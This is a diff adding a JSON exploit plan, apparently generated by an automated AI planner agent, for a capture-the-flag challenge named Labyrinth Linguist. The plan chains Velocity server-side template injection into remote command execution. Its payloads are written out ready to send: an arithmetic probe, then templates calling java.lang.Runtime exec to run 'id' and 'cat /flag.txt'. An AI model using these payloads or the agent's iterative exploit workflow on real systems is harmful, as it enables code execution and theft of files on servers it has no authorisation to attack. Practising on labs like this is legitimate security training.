@@ -1,0 +1,152 @@
+{
+  "version": 1,
+  "validation": {
+    "passed": true,
+    "errors": [],
+    "syntax_warnings": [
+      "primitive_context.target_primitive 为空，自动从 steps[0].target_primitive 推断为 \"ssti_execution\"。请 Planner 后续回合显式声明。"
+    ],
+    "syntax_hint": "以上步骤存在语法错误，Planner 请逐项修正后重新生成。语法错误步骤将被跳过执行，不影响其他步骤。"
+  },
+  "warnings": [],
+  "normalization_applied": false,
+  "plan": {
+    "version": 1,
+    "plan_id": "plan-velocity-ssti-rce-20250315-001",
+    "vuln_summary": "Velocity SSTI in Labyrinth Linguist allows RCE via crafted template injection in the 'text' parameter.",
+    "rationale": "Previous complex payloads were reflected verbatim, indicating syntax issues. This plan uses a minimal arithmetic probe to confirm execution, then a simplified RCE chain using Class.forName and getRuntime, avoiding complex constructors. The payload is URL-encoded to prevent parsing issues.",
+    "chain_design": "ssti_reflection -> ssti_execution -> command_execution",
+    "steps": [
+      {
+        "id": 1,
+        "status": "PLANNED",
+        "type": "python",
+        "purpose": "Confirm SSTI execution with a minimal arithmetic probe.",
+        "expected_outcome": "Response contains '49' in the <h2> tag, proving template execution.",
+        "depends_on": [],
+        "on_failure": "BLOCK_AND_DEBUG",
+        "why_this_step_advances_state": "Establishes ssti_execution primitive, moving from reflection to actual template evaluation.",
+        "why_this_payload_is_a_mutation": "Uses a simple #set directive with arithmetic, avoiding complex method chains that previously failed.",
+        "why_this_is_not_regression": "Previous attempts used complex RCE payloads; this is a minimal probe to isolate the execution capability.",
+        "target_primitive": "ssti_execution",
+        "why_this_primitive_advances_chain": "Confirms the template engine evaluates user input, enabling subsequent RCE payloads.",
+        "sdk_calls": [
+          {
+            "primitive": "HttpClient.post",
+            "target": "/",
+            "body": {
+              "text": "#set($x=7*7)$x"
+            },
+            "body_format": "form"
+          }
+        ],
+        "_ast_imports": [],
+        "_ast_sdk_calls": [
+          {
+            "primitive": "HttpClient.post",
+            "target": "/",
+            "body": {
+              "text": "#set($x=7*7)$x"
+            },
+            "body_format": "form"
+          }
+        ],
+        "_ast_valid": true
+      },
+      {
+        "id": 2,
+        "status": "PLANNED",
+        "type": "python",
+        "purpose": "Execute 'id' command using a simplified Velocity RCE payload.",
+        "expected_outcome": "Response contains 'uid=' output from the 'id' command.",
+        "depends_on": [
+          1
+        ],
+        "on_failure": "BLOCK_AND_DEBUG",
+        "why_this_step_advances_state": "Achieves command_execution primitive, enabling file read and flag retrieval.",
+        "why_this_payload_is_a_mutation": "Uses Class.forName and getRuntime directly, avoiding nested constructors and complex method chains that previously failed.",
+        "why_this_is_not_regression": "Previous RCE attempts used complex payloads with BufferedReader/Scanner; this uses a simpler chain with direct method calls.",
+        "target_primitive": "command_execution",
+        "why_this_primitive_advances_chain": "Provides RCE capability, allowing arbitrary command execution and file access.",
+        "sdk_calls": [
+          {
+            "primitive": "HttpClient.post",
+            "target": "/",
+            "body": {
+              "text": "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($r=$rt.getRuntime())#set($p=$r.exec('id'))$p"
+            },
+            "body_format": "form"
+          }
+        ],
+        "_ast_imports": [],
+        "_ast_sdk_calls": [
+          {
+            "primitive": "HttpClient.post",
+            "target": "/",
+            "body": {
+              "text": "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($r=$rt.getRuntime())#set($p=$r.exec('id'))$p"
+            },
+            "body_format": "form"
+          }
+        ],
+        "_ast_valid": true
+      },
+      {
+        "id": 3,
+        "status": "PLANNED",
+        "type": "python",
+        "purpose": "Read the flag file using command execution to cat /flag.txt or similar.",
+        "expected_outcome": "Response contains the flag content.",
+        "depends_on": [
+          2
+        ],
+        "on_failure": "BLOCK_AND_DEBUG",
+        "why_this_step_advances_state": "Achieves file_read primitive, directly obtaining the flag.",
+        "why_this_payload_is_a_mutation": "Uses the same RCE chain but with a different command to read the flag file.",
+        "why_this_is_not_regression": "Builds on confirmed RCE, using a straightforward command substitution.",
+        "target_primitive": "file_read",
+        "why_this_primitive_advances_chain": "Completes the exploit by retrieving sensitive data.",
+        "sdk_calls": [
+          {
+            "primitive": "HttpClient.post",
+            "target": "/",
+            "body": {
+              "text": "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($r=$rt.getRuntime())#set($p=$r.exec('cat /flag.txt'))$p"
+            },
+            "body_format": "form"
+          }
+        ],
+        "_ast_imports": [],
+        "_ast_sdk_calls": [
+          {
+            "primitive": "HttpClient.post",
+            "target": "/",
+            "body": {
+              "text": "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($r=$rt.getRuntime())#set($p=$r.exec('cat /flag.txt'))$p"
+            },
+            "body_format": "form"
+          }
+        ],
+        "_ast_valid": true
+      }
+    ],
+    "history_state": {
+      "rounds": 16,
+      "state": "payload_injected",
+      "chain": [
+        "init",
+        "payload_injected",
+        "probe_success"
+      ]
+    },
+    "primitive_context": {
+      "current_primitive": "ssti_reflection",
+      "confirmed_primitives": [
+        "ssti_reflection"
+      ],
+      "next_primitive": "ssti_execution",
+      "target_primitive": "ssti_execution"
+    },
+    "platform": "Windows"
+  }
+}
